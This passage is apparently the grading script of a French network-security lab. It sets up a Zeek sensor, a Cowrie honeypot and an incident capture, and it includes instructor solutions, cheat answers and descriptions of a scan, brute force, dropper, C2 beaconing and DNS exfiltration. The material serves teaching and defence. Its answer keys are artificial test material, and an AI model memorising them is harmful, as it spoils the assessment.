        self.file('honeypot', NFT_CONF, self.nft_text(), permissions=0o755)
        self.cmd('honeypot', f"nft -f {NFT_CONF} && systemctl enable nftables >/dev/null 2>&1")
        self.file('honeypot', hp.COWRIE_CFG, self.cowrie_cfg_text(), owner="cowrie:cowrie")
        self.file('honeypot', hp.USERDB, self.userdb_text(), owner="cowrie:cowrie")
        self.cmd('honeypot', "systemctl enable cowrie >/dev/null 2>&1; systemctl restart cowrie", step=2)

    def _solve_intel(self):
        self.file('sensor', INTEL_FILE, self.intel_text())
        for line in self.intel_lines():
            self.cmd('sensor', f"grep -qF {shlex.quote(line)} {zeek.LOCAL_ZEEK} || "
                               f"echo {shlex.quote(line)} >> {zeek.LOCAL_ZEEK}")

    # -- states ----------------------------------------------------------------------------

    def hosts_content(self, machine: str) -> str:
        d = self.data
        names = [('gw', d.ips.gw_lan), ('gw-wan', d.ips.gw_wan), ('gw-dmz', d.ips.gw_dmz), ('www', d.ips.www),
                 ('honeypot', d.ips.honeypot), ('sensor', d.ips.sensor), ('analyst', d.ips.analyst),
                 ('attacker', d.ips.attacker)]
        lines = ["127.0.0.1\tlocalhost", f"127.0.1.1\t{machine}.{DOMAIN}\t{machine}", ""]
        lines += [f"{ip.ip}\t{name}.{DOMAIN}\t{name}" for name, ip in names]
        return "\n".join(lines) + "\n"

    def dns_hosts(self) -> str:
        d = self.data
        names = [('gw', d.ips.gw_dmz), ('www', d.ips.www), ('honeypot', d.ips.honeypot), ('sensor', d.ips.sensor),
                 ('analyst', d.ips.analyst)]
        return "".join(f"{ip.ip}\t{name}.{DOMAIN}\t{name}\n" for name, ip in names)

    def _configure_network(self):
        d = self.data
        for m in ('attacker', 'probe', 'www', 'sensor', 'analyst'):
            set_ip_forward(net_scheme=self, machine_name=m, ip_forward=False)
        set_ip_forward(net_scheme=self, machine_name='gw', ip_forward=True)
        # the honeypot is privileged: /proc/sys is writable as is
        self.cmd('honeypot', "sysctl -w net.ipv4.ip_forward=0 >/dev/null")
        self.cmd('gw', f"ip address add {d.ips.gw_wan} dev eth0; ip address add {d.ips.gw_dmz} dev eth1; "
                       f"ip address add {d.ips.gw_lan} dev eth2")
        for m in ('attacker', 'probe'):
            self.cmd(m, f"ip address add {getattr(d.ips, m)} dev eth0; ip route add default via {d.ips.gw_wan.ip}")
        for m in ('www', 'honeypot'):
            self.cmd(m, f"ip address add {getattr(d.ips, m)} dev eth0; ip route add default via {d.ips.gw_dmz.ip}")
        self.cmd('analyst', f"ip address add {d.ips.analyst} dev eth0; ip route add default via {d.ips.gw_lan.ip}")
        # the sensor: an address on its management interface only; the capture interface stays bare
        self.cmd('sensor', f"ip address add {d.ips.sensor} dev eth0; ip route add default via {d.ips.gw_lan.ip}; "
                           f"ip link set {SENSOR_IFACE} up")
        self.cmd('probe', "; ".join(f"ip address add {role_addr(d, r)}/{d.nets.wan.prefixlen} dev eth0"
                                    for r in PROBE_ROLES))

    @sre_state(user_allowed=False)
    def initial(self):
        d = self.data
        www = str(d.ips.www.ip)
        self._configure_network()
        for m in self.get_machine_names():
            self.file(m, "/etc/hosts", self.hosts_content(m))
            self.file(m, "/etc/resolv.conf", f"nameserver {www}\nsearch {DOMAIN}\n")
        # www: the web site and the DNS server of corp.lab (an unknown name of corp.lab: NXDOMAIN at once)
        self.file('www', f"{WWW_ROOT}/index.html",
                  f"<html><head><title>www.{DOMAIN}</title></head><body><h1>{DOMAIN}</h1></body></html>\n")
        self.file('www', f"{WWW_ROOT}/sre/{d.token}.html", f"<html><body>{d.token}</body></html>\n")
        self.file('www', DNSMASQ_HOSTS, self.dns_hosts())
        self.cmd('www', "nginx", step=2)
        self.cmd('www', f"dnsmasq --no-resolv --no-hosts --addn-hosts={DNSMASQ_HOSTS} --local=/{DOMAIN}/ "
                        f"--domain-needed --listen-address={www} --bind-interfaces", step=2)
        # honeypot: the real SSH server, on port 22 for now
        self.cmd('honeypot', "systemctl start ssh", step=2)
        # sensor: the capture generator of the grader, the training capture of part 2, the scripts' directory
        install_pcap_tool(self, 'sensor')
        write_pcap(self, 'sensor', TRAINING_PCAP, training_spec(d), step=2)
        self.cmd('sensor', f"mkdir -p {SCRIPT_DIR}")
        # analyst: the evidence of parts 3 and 5
        pcap = build_incident_pcap(d)
        self.file('analyst', INCIDENT_PCAP, pcap, permissions=0o444)
        self.file('analyst', f"{INCIDENT_PCAP}.sha256", f"{hashlib.sha256(pcap).hexdigest()}  incident.pcap\n",
                  permissions=0o444)
        events, conns, _ = build_history(d.history, d)
        self.file('analyst', HISTORY_COWRIE, hp.render_events(events), permissions=0o444)
        self.file('analyst', HISTORY_CONN, "".join(json.dumps(c) + "\n" for c in conns), permissions=0o444)
        self.cmd('analyst', f"mkdir -p {EXTRACTED_DIR}")
        # the grader's tool
        install_login_probe(self, 'probe')

    @sre_state(user_allowed=False, description=tr("Partie 1 seule : la sonde Zeek configurée et lancée.",
                                                  en="Part 1 alone: the Zeek sensor configured and running."))
    def part1_sensor(self):
        self._solve_sensor()

    @sre_state(user_allowed=False, description=tr("Partie 2 seule : les deux scripts de détection.",
                                                  en="Part 2 alone: the two detection scripts."))
    def part2_scripts(self):
        self._solve_scripts()

    @sre_state(user_allowed=False,
               description=tr("Partie 3 seule : le fichier extrait et les réponses de l'enquête.",
                              en="Part 3 alone: the extracted file and the answers of the investigation."))
    def part3_investigation(self):
        self._solve_investigation()

    @sre_state(user_allowed=False, description=tr("Partie 4 seule : le pot de miel Cowrie.",
                                                  en="Part 4 alone: the Cowrie honeypot."))
    def part4_honeypot(self):
        self._solve_honeypot()

    @sre_state(user_allowed=False, description=tr("Partie 5 seule : les réponses de la corrélation.",
                                                  en="Part 5 alone: the answers of the correlation."))
    def part5_correlation(self):
        """Forms only: the answers come from the cheat answers of the state."""
        self.cmd('analyst', "true")

    @sre_state(user_allowed=False, description=tr("Bonus seul : les indicateurs du cadre Intel.",
                                                  en="Bonus alone: the indicators of the Intel framework."))
    def bonus_intel(self):
        self._solve_intel()

    @sre_state(user_allowed=False,
               description=tr("Solution de référence complète (toutes les parties et le bonus, formulaires remplis).",
                              en="Complete reference solution (every part and the bonus, forms filled in)."))
    def final(self):
        """Reference solution, applicable more than once: every grade element reaches its maximum."""
        self._solve_scripts()
        self._solve_intel()
        self._solve_investigation()
        self._solve_honeypot()
        self._solve_sensor()


# ---------------------------------------------------------------------------
# Grade
# ---------------------------------------------------------------------------


def _norm(s) -> str:
    return " ".join(str(s or "").split()).lower()


def _same_ip(answer, expected) -> bool:
    return _norm(answer).split('/')[0] == str(expected)


def _number(answer) -> Optional[float]:
    try:
        return float(str(answer or "").strip().replace(",", "."))
    except ValueError:
        return None


def _ports(answer) -> set:
    return {int(p) for p in "".join(c if c.isdigit() else " " for c in str(answer or "")).split()}


def _same_password(answer, expected) -> bool:
    text = str(answer or "").strip()
    return text == expected or unquote_plus(text) == expected


def _block(text: str) -> str:
    """A markdown code block (a plain string: the content may hold braces)."""
    return "\n```\n" + text.rstrip("\n") + "\n```\n"


class Grade(Grade0):
    def __init__(self, net_scheme):
        super().__init__(net_scheme)
        self.section_fmt = [("N", 1), ("N", 2), ("l", 3), ("N", 4)]

    def grade(self):
        super().grade()
        d = self.get_data()
        inc, hist, hpd = d.incident, d.history, d.honeypot
        www, hp_ip, analyst = str(d.ips.www.ip), str(d.ips.honeypot.ip), str(d.ips.analyst.ip)
        src_zeek, src_hp = role_addr(d, 'zeek'), role_addr(d, 'honeypot')
        page = f"/sre/{d.token}.html"
        qname = f"{d.token}.{DOMAIN}"

        # =====================================================================
        # step 1: clocks, processes, offline runs, extracted files
        # =====================================================================
        t0_sensor = get_epoch(self, 'sensor', step=1)
        t0_hp = get_epoch(self, 'honeypot', step=1)
        zeek_procs = zeek.get_processes(self, 'sensor', step=1)
        scan_run = zeek.offline_zeek(self, 'sensor', web_scan_spec(d), [WEB_SCAN_SCRIPT], name="webscan", step=1)
        hp_run = zeek.offline_zeek(self, 'sensor', honeypot_spec(d), [HONEYPOT_SCRIPT], name="honeypot", step=1)
        intel_run = zeek.offline_zeek(self, 'sensor', intel_spec(d), ["local"], name="intel", logs=("intel",),
                                      pseudo_realtime=True, step=1, timeout=90)
        owners = hp.get_owners(self, 'honeypot', step=1)
        enabled = hp.unit_enabled(self, 'honeypot', step=1)
        extracted, _ = self.test('analyst', f"sha256sum {EXTRACTED_DIR}/* {EXTRACTED_DIR}/.[!.]* 2>/dev/null",
                                 step=1, allow_error=True)
        # diagnostics kept in the archive
        for m, c in (('sensor', f"{zeek.ZEEKCTL} status 2>&1 | tail -n 3"),
                     ('sensor', f"tail -n 5 {zeek.CURRENT_LOGS}/reporter.log 2>/dev/null"),
                     ('honeypot', f"tail -n 5 {hp.COWRIE_LOG}"), ('honeypot', "nft list ruleset"),
                     ('honeypot', "ss -ltnp")):
            self.test(m, c, step=1, allow_error=True)

        # =====================================================================
        # step 2: the probe and analyst act (every check from its own address)
        # =====================================================================
        def session(user, password):
            return (f"python3 {LOGIN_PROBE} --timeout 20 --bind {src_hp} --port 22 --command 'hostname; uname -r' "
                    f"ssh {hp_ip} {shlex.quote(user)} {shlex.quote(password)}")

        cases = {
            'root_ok': ("root", hpd["root_passwords"][0]),
            'root_bad': ("root", hpd["root_refused"]),
            'user2_ok': (hpd["user2"], hpd["user2_try"]),
            'user2_bad': (hpd["user2"], hpd["user2_refused"]),
            'unknown': (hpd["unknown"], hpd["unknown_password"]),
        }
        probe_parts = {
            'web': (f"curl -s -m 5 --interface {src_zeek} -o /dev/null -w '%{{http_code}}' "
                    f"-A 'SRE-probe/{d.token}' http://{www}{page}"),
            'dns': f"dig -b {src_zeek} +tries=1 +time=2 @{www} {qname} A | grep -c 'status:'",
            'banner22': hp.banner_cmd(hp_ip, 22, 'p22', src_hp),
            'banneradmin': hp.banner_cmd(hp_ip, ADMIN_PORT, 'wanadmin', src_hp),
        }
        probe_parts.update({tag: session(user, pw) for tag, (user, pw) in cases.items()})
        probe_out, _ = self.test('probe', parallel_cmd(probe_parts), step=2, timeout=90, allow_error=True)
        probe_out = probe_out or ""
        analyst_out, _ = self.test('analyst', f"curl -s -m 5 -o /dev/null -A 'SRE-analyst/{d.token}' "
                                              f"http://{www}/index.html; echo; "
                                   + hp.banner_cmd(hp_ip, ADMIN_PORT, 'lanadmin'), step=2, allow_error=True)

        # =====================================================================
        # step 3: the consequences (Zeek logs, Cowrie events)
        # =====================================================================
        self.test('sensor', f"sleep {LOG_WAIT}", step=3, timeout=LOG_WAIT + 10, allow_error=True)
        conn_entries, _ = zeek.get_log(self, 'sensor', 'conn', [src_zeek, analyst], step=3)
        http_entries, http_json = zeek.get_log(self, 'sensor', 'http', [d.token], step=3)
        dns_entries, _ = zeek.get_log(self, 'sensor', 'dns', [d.token], step=3)
        hp_events = hp.get_events(self, 'honeypot', [src_hp], step=3)

        # ---------------- facts: part 1 ----------------------------------------------------
        sensor_capture = any(zeek.capture_interface(c) == SENSOR_IFACE for c in zeek_procs)
        conns = zeek.entries_since(conn_entries, t0_sensor)

        def conn_from(src):
            return [e for e in conns if e.get("id.orig_h") == src and e.get("id.resp_h") == www
                    and str(e.get("id.resp_p")) == "80"]

        probe_conn = [e for e in conn_from(src_zeek)
                      if zeek.zeek_bool(e.get("local_orig")) is False and zeek.zeek_bool(e.get("local_resp")) is True]
        analyst_conn = [e for e in conn_from(analyst)
                        if zeek.zeek_bool(e.get("local_orig")) is True and zeek.zeek_bool(e.get("local_resp")) is True]
        http_seen = [e for e in zeek.entries_since(http_entries, t0_sensor)
                     if e.get("id.orig_h") == src_zeek and e.get("uri") == page]
        dns_seen = [e for e in zeek.entries_since(dns_entries, t0_sensor)
                    if e.get("id.orig_h") == src_zeek and str(e.get("query") or "").lower() == qname.lower()]

        # ---------------- facts: part 2 ----------------------------------------------------
        scan_notices = zeek.notices(scan_run['logs'].get('notice', []), NOTE_WEB_SCAN)
        scan_cases = web_scan_cases(d)
        notified = [e.get("src") for e in scan_notices]
        fast_ok = scan_cases['fast']['src'] in notified

        # the capture holds 6 connections: 2 opened by the honeypot (tcp/80 to www, udp/53), 3 received
        # (from wan to its port 22), 1 elsewhere; a right script raises exactly 2 notices
        out_notices = zeek.notices(hp_run['logs'].get('notice', []), NOTE_OUTBOUND)
        out_tcp = [e for e in out_notices if e.get("id.orig_h") == hp_ip and e.get("id.resp_h") == www
                   and str(e.get("id.resp_p")) == "80"]
        out_udp = [e for e in out_notices if e.get("id.orig_h") == hp_ip and str(e.get("id.resp_p")) == "53"]
        few = 0 < len(out_notices) <= 2
        out_detects = bool(out_tcp) or (few and not any(e.get("id.orig_h") for e in out_notices))
        out_quiet = out_detects and few and all(e.get("id.orig_h") in (None, hp_ip) for e in out_notices)

        # ---------------- facts: part 4 ----------------------------------------------------
        banner22 = hp.parse_banner(section_text(probe_out, 'banner22'), 'p22')
        wan_admin = hp.parse_banner(section_text(probe_out, 'banneradmin'), 'wanadmin')
        lan_admin = hp.parse_banner(analyst_out or "", 'lanadmin')
        admin_lan_ok = lan_admin.startswith("SSH-2.0-OpenSSH") and lan_admin != FAKE_BANNER
        events = hp.events_since(hp_events, t0_hp, src=src_hp)
        logins = hp.login_results(events)
        outputs = {}
        for tag in cases:
            ok, output = hp.session_output(section_text(probe_out, tag))
            outputs[tag] = hp.output_lines_after_mark(output) if ok else []
        lines = outputs['root_ok'] or outputs['user2_ok']
        sensors = {e.get("sensor") for e in events}

        def login(tag):
            return logins.get(cases[tag])

        addressing = tr("""
| réseau | préfixe | machines |
|--------|---------|----------|
| `wan` (« Internet ») | `{wan}` | `gw` eth0 (`{gw_wan}`), `attacker` (`{attacker}`, votre machine d'attaque) |
| `dmz` (un **concentrateur**) | `{dmz}` | `gw` eth1 (`{gw_dmz}`), `www` (`{www}`, serveur web et DNS de `corp.lab`), `honeypot` (`{hp}`), `sensor` eth1 (**sans adresse**) |
| `lan` (interne) | `{lan}` | `gw` eth2 (`{gw_lan}`), `sensor` eth0 (`{sensor}`, gestion de la sonde), `analyst` (`{analyst}`, poste d'investigation) |
""").format(wan=d.nets.wan, gw_wan=d.ips.gw_wan.ip, attacker=d.ips.attacker.ip, dmz=d.nets.dmz,
            gw_dmz=d.ips.gw_dmz.ip, www=www, hp=hp_ip, lan=d.nets.lan, gw_lan=d.ips.gw_lan.ip,
            sensor=d.ips.sensor.ip, analyst=analyst)

        self.question_dummy(
            title=tr("Organisation du TP"),
            hash="8dd9dde7cd31601d",
            description=tr("""
Lisez l'onglet **Informations** : il présente la supervision de sécurité réseau, Zeek (journaux,
zeekctl, scripts, cadre Intel), l'analyse d'une capture, les pots de miel et Cowrie, la corrélation des
journaux.

**La maquette** (onglet *Schéma*) : un routeur `gw` relie « Internet » (`wan`, où se trouve votre
machine `attacker`) à une DMZ et au réseau interne `lan`. La DMZ est un **concentrateur** (*hub*) : la
sonde `sensor` y voit tout le trafic.
""")
            + addressing
            + tr("""
Déjà en place (ne pas modifier) : les adresses et les routes, les noms dans `/etc/hosts` (`www`,
`honeypot`, `sensor`, `analyst`...), le serveur web et le serveur DNS de `corp.lab` sur `www`, le vrai
serveur SSH de `honeypot` (comptes `student` / `student` et `root` / `root`, sur le port 22 pour
l'instant). Zeek (`/opt/zeek`) et Cowrie (`/opt/cowrie`) sont installés, arrêtés, sur `sensor`,
`honeypot` et `analyst`. Les pièces de l'enquête sont sur `analyst`, dans `/root/evidence/`.

Règles valables pour tout le TP :

- chaque **partie est indépendante** : la terminer donne ses points quel que soit l'état des autres.
  Ce qui est noté est l'état final des machines et vos réponses : laissez vos configurations en place ;
- l'évaluation est surtout **comportementale** : une machine cachée de `wan` utilise les adresses
  `{first}` et `{second}` pour des requêtes HTTP et DNS vers `www` et des connexions SSH vers
  `honeypot` (ports 22 et {admin}) ; vous verrez ces adresses dans les journaux, c'est normal. Elle
  rejoue aussi hors ligne, sur `sensor`, des captures avec vos scripts ;
- les parties 3 et 5 sont des enquêtes : leurs réponses se donnent dans les formulaires ;
- une évaluation automatique a lieu toutes les cinq minutes.
""").format(first=src_zeek, second=src_hp, admin=ADMIN_PORT)
            + instructor(tr("""
**Pour l'enseignant.** Chaque question se termine par sa solution, calculée pour ce projet. L'état
`final` applique toute la solution (ré-applicable) et remplit les formulaires ; les états `part1_sensor`
... `bonus_intel` appliquent une partie seule (vérification de l'indépendance).

La sonde cachée (`probe`, sur `wan`) : `{first}` envoie une requête HTTP (`{page}`) et une requête DNS
(`{qname}`) vers `www` (partie 1) ; `{second}` lit les bannières des ports 22 et {admin} de `honeypot` et
ouvre cinq sessions SSH sur le port 22 (partie 4). `analyst` fait une requête HTTP vers `www` (partie 1)
et lit la bannière du port {admin} (partie 4). Les journaux de Zeek sont lus {wait} s plus tard.

Les parties 2 et bonus sont notées hors ligne sur `sensor` : à chaque évaluation une capture neuve est
écrite (`lib/suricata_pcap.py`, d'autres adresses que `{training}`), puis lue par `zeek -C -r` avec un
script seul (partie 2) ou avec `local` et `--pseudo-realtime=1` (bonus).
""").format(first=src_zeek, second=src_hp, admin=ADMIN_PORT, page=page, qname=qname, wait=LOG_WAIT,
            training=TRAINING_PCAP)),
        )

        # =====================================================================
        # Part 1 — the Zeek sensor
        # =====================================================================
        part1 = self.add_grade_part(no_tr("part1"), tr("Partie 1 — La sonde Zeek"))

        self.question_dummy(
            section=self.section(0),
            title=tr("Mettre la sonde en service"),
            hash="377d89f58054eaf2",
            description=tr("""
Sur `sensor`, l'interface `eth1` (sans adresse) est branchée sur le concentrateur de la DMZ et
l'interface `eth0` sur le réseau interne (gestion). Configurez Zeek (sections @@ref:zeek@@ à
@@ref:zeekctl@@) :

1. `node.cfg` : une sonde autonome qui capture sur **`eth1`** ;
2. `networks.cfg` : exactement les deux réseaux internes, la DMZ `{dmz}` et le réseau `lan` `{lan}` ;
   « Internet » (`wan`) utilise ici `{wan}`, une plage que Zeek range par défaut parmi les adresses
   privées, donc locales : dans `local.zeek`, faites que seul `networks.cfg` compte ;
3. `local.zeek` : des journaux au format **JSON** ;
4. `zeekctl deploy`, puis `zeekctl status`.

Depuis `attacker`, visitez `http://www/` et faites une requête DNS (`dig @www www.corp.lab`), depuis
`analyst` aussi, puis lisez `/opt/zeek/logs/current/` (`conn.log`, `http.log`, `dns.log`) : retrouvez
vos requêtes et le sens que Zeek leur donne (`local_orig`, `local_resp`). L'évaluation fait de même.
""").format(dmz=d.nets.dmz, lan=d.nets.lan, wan=d.nets.wan)
            + instructor(tr("""
**Solution.** `{node}` :
""").format(node=zeek.NODE_CFG) + no_tr(_block(zeek.render_node_cfg(SENSOR_IFACE))) + tr("`{nets}` :").format(
                nets=zeek.NETWORKS_CFG) + no_tr(_block(zeek.render_networks_cfg(self.net_scheme.sensor_networks()))) + tr("""
puis à la fin de `{local}` les lignes `{load}` et `{private}` (sans elle, `wan`, dans 198.18.0.0/15,
est local : `local_orig` vaut T pour la sonde cachée), et `zeekctl deploy`. L'état `final` le fait par :
""").format(load=JSON_LOAD, private=PRIVATE_NOT_LOCAL, local=zeek.LOCAL_ZEEK) + no_tr(_block("\n".join(self.net_scheme.sensor_cmds())))),
        )
        self.add_grade_element(
            title=no_tr("zeek_capture"), max_grade=3, grade_part=part1, grade=3 * int(sensor_capture),
            description=tr("Zeek tourne sur sensor et capture sur eth1"))
        self.add_grade_element(
            title=no_tr("zeek_json"), max_grade=3, grade_part=part1, grade=3 * int(bool(http_seen) and http_json),
            description=tr("la requête HTTP de l'évaluation est dans http.log, au format JSON"))
        self.add_grade_element(
            title=no_tr("zeek_local_nets"), max_grade=4, grade_part=part1,
            grade=2 * int(bool(probe_conn)) + 2 * int(bool(probe_conn) and bool(analyst_conn)),
            description=tr("conn.log : wan → www entrante (local_orig F, local_resp T), analyst → www interne (T, T)"))
        self.add_grade_element(
            title=no_tr("zeek_dns"), max_grade=3, grade_part=part1, grade=3 * int(bool(dns_seen)),
            description=tr("la requête DNS de l'évaluation est dans dns.log"))

        q1_answers = {"uid": "connection", "networks": "direction", "https": "metadata"}
        q1 = self.question_form(
            section=self.section(0),
            title=tr("Ce que Zeek écrit"),
            hash="09cd8a2b19607b32",
            description=tr("""
- que désigne le champ `uid` présent dans `conn.log`, `http.log`, `dns.log`... ? @@{uid:>une connexion : toutes les lignes qui la concernent portent le même uid>>>connection|la sonde qui a écrit la ligne>>>sensor|l'utilisateur connecté au serveur>>>user}@@
- à quoi sert `networks.cfg` ? @@{networks:>dire quels réseaux sont locaux : Zeek en déduit le sens des connexions (local_orig, local_resp)>>>direction|choisir les réseaux à capturer>>>capture|exclure des réseaux de l'analyse>>>exclude}@@
- que voit Zeek d'une session HTTPS ? @@{https:>les métadonnées : nom du serveur (SNI), certificat, versions, volumes, pas les URL ni le contenu>>>metadata|tout, il déchiffre TLS>>>everything|rien du tout>>>nothing}@@
""")
            + instructor(tr("""
**Solution.** L'`uid` identifie une connexion et relie ses lignes dans tous les journaux.
`networks.cfg` remplit `Site::local_nets` : `local_orig` / `local_resp`, donc le sens de chaque connexion.
D'une session TLS, Zeek ne voit que les métadonnées (`ssl.log`, `x509.log`).
""")),
            cheat_answers={"final": q1_answers, "part1_sensor": q1_answers},
        )
        self.add_grade_element(
            title=no_tr("q_zeek"), max_grade=5, grade_part=part1, scope=params.EXO_EVAL_SCOPE,
            grade=2 * int(_norm(q1.get("uid")) == "connection") + 2 * int(_norm(q1.get("networks")) == "direction")
            + int(_norm(q1.get("https")) == "metadata"),
            description=tr("uid = une connexion ; networks.cfg = le sens ; HTTPS = les métadonnées"))

        # =====================================================================
        # Part 2 — Zeek scripts
        # =====================================================================
        part2 = self.add_grade_part(no_tr("part2"), tr("Partie 2 — Écrire des scripts de détection"))

        self.question_dummy(
            section=self.section(0),
            title=tr("Deux scripts de détection"),
            hash="e516732082a5e204",
            description=tr("""
Sur `sensor`, écrivez dans `{dir}` (sections @@ref:scripting@@ et @@ref:notice@@) :

1. **`web-scan.zeek`** : une notice **`SRE::Web_Scan`**, avec `$src` = l'adresse du client, quand un même
   client reçoit au moins **{n}** réponses HTTP **404** en moins de **2 minutes**, comptées à partir de sa
   première 404. **Une seule** notice par client. Ni {below} réponses 404, ni des réponses 200, ni {n}
   réponses 404 étalées sur plusieurs minutes ne doivent en lever.
2. **`honeypot.zeek`** : une notice **`SRE::Honeypot_Outbound`**, avec `$conn`, pour **toute connexion
   ouverte par** le pot de miel `{hp}`, quel que soit le protocole (TCP, UDP...). Les connexions qu'il
   **reçoit** (les attaques) ne doivent pas en lever.

Mettez-les au point hors ligne sur la capture `{training}`, qui contient ces cas :

```
cd $(mktemp -d) && zeek -C -r {training} {dir}/web-scan.zeek && jq -c . notice.log
```

(les journaux sont en TSV si vous ne chargez pas `policy/tuning/json-logs` : `cat notice.log`).
L'évaluation rejoue **chaque script seul**, hors ligne, sur une autre capture des mêmes cas (d'autres
adresses), avec des journaux JSON : elle ne dépend pas de la partie 1.
""").format(dir=SCRIPT_DIR, n=d.scan_threshold, below=d.scan_threshold - 1, hp=hp_ip, training=TRAINING_PCAP)
            + instructor(tr("""
**Solution** (`{web}`) :
""").format(web=WEB_SCAN_SCRIPT) + no_tr(_block(self.net_scheme.web_scan_text())) + tr("""
`&create_expire=2min` : la fenêtre commence à la première 404 (avec `&write_expire`, une 404 toutes les
40 s prolongerait l'entrée indéfiniment) ; `==` plutôt que `>=` : une seule notice. Et `{hpf}` :
""").format(hpf=HONEYPOT_SCRIPT) + no_tr(_block(self.net_scheme.honeypot_script_text())) + tr("""
`new_connection` voit aussi l'UDP et l'ICMP (`connection_established` ne voit que le TCP établi, et
`http_request` que le HTTP). Les erreurs des exécutions hors ligne sont gardées dans l'archive.
""")),
        )
        n_fast = notified.count(scan_cases['fast']['src'])
        self.add_grade_element(
            title=no_tr("scan_detects"), max_grade=3, grade_part=part2,
            grade=2 * int(fast_ok) + int(n_fast == 1),
            description=tr("SRE::Web_Scan pour le client aux nombreuses 404 (2), une seule fois (1)"))
        self.add_grade_element(
            title=no_tr("scan_threshold"), max_grade=1, grade_part=part2,
            grade=int(scan_cases['exact']['src'] in notified),
            description=tr("SRE::Web_Scan dès le seuil atteint exactement"))
        self.add_grade_element(
            title=no_tr("scan_quiet"), max_grade=3, grade_part=part2,
            grade=sum(int(fast_ok and scan_cases[c]['src'] not in notified) for c in ('below', 'ok200', 'slow')),
            description=tr("aucune notice sous le seuil, pour des réponses 200, ni pour des 404 étalées (fenêtre de 2 min)"))
        self.add_grade_element(
            title=no_tr("outbound_tcp"), max_grade=3, grade_part=part2,
            grade=2 * int(out_detects) + int(bool(out_tcp)),
            description=tr("SRE::Honeypot_Outbound pour la connexion TCP ouverte par le pot de miel (2), avec $conn (1)"))
        self.add_grade_element(
            title=no_tr("outbound_udp"), max_grade=2, grade_part=part2, grade=2 * int(bool(out_udp)),
            description=tr("SRE::Honeypot_Outbound pour une requête DNS (UDP) du pot de miel"))
        self.add_grade_element(
            title=no_tr("outbound_quiet"), max_grade=2, grade_part=part2, grade=2 * int(out_quiet),
            description=tr("aucune notice pour les connexions reçues par le pot de miel ni pour les autres machines"))

        # =====================================================================
        # Part 3 — the investigation of a capture
        # =====================================================================
        part3 = self.add_grade_part(no_tr("part3"), tr("Partie 3 — Enquête sur une capture"))

        self.question_dummy(
            section=self.section(0),
            title=tr("L'enquête"),
            hash="d3d13cd4b5dce2ff",
            description=tr("""
Il y a quelques jours, l'équipe d'exploitation a remarqué un trafic inhabituel. La sonde enregistrait
alors tout le trafic de la DMZ et du réseau interne : la capture est sur `analyst`, dans `{pcap}`, avec
son empreinte `{pcap}.sha256`. Reconstituez l'incident (sections @@ref:response@@, @@ref:pcap@@ et
@@ref:patterns@@) : vérifiez d'abord l'intégrité de la preuve, puis travaillez sur une copie, avec Zeek
(`zeek -C -r ... local`), `zeek-cut` ou `jq`, et `tshark`.

Les machines de la capture : le serveur de fichiers `files` (`{files}`), l'application `intranet`
(`{intranet}`, `intranet.corp.lab`), le résolveur DNS `{resolver}`, des postes du réseau interne
`{lan}` ; les adresses de `{wan}` et les autres sont « Internet ».
""").format(pcap=INCIDENT_PCAP, files=inc["files"], intranet=inc["intranet"], resolver=inc["resolver"],
            lan=d.nets.lan, wan=d.nets.wan)
            + instructor(tr("""
**Pour l'enseignant.** La chronologie de la capture (`{pcap}`, générée par `lib/incident_pcap.py`) :
balayage SYN de `files` par `{scanner}` à +60 s ; {count} `POST /login` sur `intranet` (User-Agent
Hydra) à partir de +150 s, la dernière réussie (302 + cookie), puis `GET /accueil` et le dépôt du fichier
(`POST /admin/upload`) ; à +330 s, `{victim}` télécharge `/uploads/{dropper}` (Wget) ; de +338 s, une
requête vers le C2 toutes les {period} s ({beacons} fois) ; vers +338 + 3,5 × {period} s, l'exfiltration
DNS. Le reste est du trafic de fond (navigation des postes).
""").format(pcap=INCIDENT_PCAP, scanner=inc["scanner"], count=len(inc["wordlist"]) + 1, victim=inc["victim"],
            dropper=inc["dropper"], period=inc["period"], beacons=inc["beacons"])),
        )

        q3a_answers = {"scanner": inc["scanner"], "ports": ",".join(str(p) for p in inc["open_ports"])}
        q3a = self.question_form(
            section=self.section(0),
            title=tr("Le balayage"),
            hash="fcb3ee1f29e569d8",
            description=tr("""
- l'adresse de la machine qui a balayé les ports de `files` : @@{scanner:[0-9.]+}@@
- les ports **ouverts** que ce balayage a trouvés, séparés par des virgules (par exemple `25,110`) : @@{ports:[0-9, ]+}@@
""")
            + instructor(tr("""
**Solution.** `{scanner}` ; ports ouverts : `{ports}`. Dans `conn.log`, les connexions de `{scanner}` vers
`{files}` : les ports fermés sont en `REJ`, les ouverts ont l'histoire `ShR` (le SYN-ACK de `files` puis
le RST du scanner) :
`jq -r 'select(."id.resp_h" == "{files}" and .history == "ShR") | ."id.resp_p"' conn.log | sort -n`
(avec tshark : `-Y 'tcp.flags.syn == 1 and tcp.flags.ack == 1 and ip.src == {files}'`).
""").format(scanner=inc["scanner"], ports=q3a_answers["ports"], files=inc["files"])),
            cheat_answers={"final": q3a_answers, "part3_investigation": q3a_answers},
        )
        self.add_grade_element(
            title=no_tr("q_scan"), max_grade=4, grade_part=part3,
            grade=2 * int(_same_ip(q3a.get("scanner"), inc["scanner"]))
            + 2 * int(_ports(q3a.get("ports")) == set(inc["open_ports"])),
            description=tr("l'adresse du scanner (2) et les ports ouverts trouvés (2)"))

        q3b_answers = {"account": inc["account"], "password": inc["password"]}
        q3b = self.question_form(
            section=self.section(0),
            title=tr("La recherche de mots de passe"),
            hash="1bc219b85241bd87",
            description=tr("""
- le compte visé par la recherche de mots de passe sur `intranet` : @@{account:.+}@@
- le mot de passe finalement trouvé (décodé) : @@{password:.+}@@
""")
            + instructor(tr("""
**Solution.** Le compte `{account}`, le mot de passe `{password}` : la seule requête `POST /login`
suivie d'une réponse 302 (les autres reçoivent 401). Dans `http.log` : `status_code` 302 ; les champs du
formulaire avec tshark (`-Y urlencoded-form -T fields -e urlencoded-form.value`, décodés), ou le flux
TCP (`%21` pour `!`, `%23` pour `#`).
""").format(account=inc["account"], password=inc["password"])),
            cheat_answers={"final": q3b_answers, "part3_investigation": q3b_answers},
        )
        self.add_grade_element(
            title=no_tr("q_bruteforce"), max_grade=4, grade_part=part3,
            grade=2 * int(_norm(q3b.get("account")) == inc["account"].lower())
            + 2 * int(_same_password(q3b.get("password"), inc["password"])),
            description=tr("le compte visé (2) et le mot de passe trouvé (2)"))

        q3c_answers = {"victim": inc["victim"], "file": inc["dropper"], "sha256": inc["sha256"]}
        q3c = self.question_form(
            section=self.section(0),
            title=tr("Le fichier malveillant"),
            hash="726abd63a23a601a",
            description=tr("""
L'attaquant a déposé un fichier sur `intranet`, qu'un poste interne a ensuite téléchargé.

- le poste interne qui l'a téléchargé : @@{victim:[0-9.]+}@@
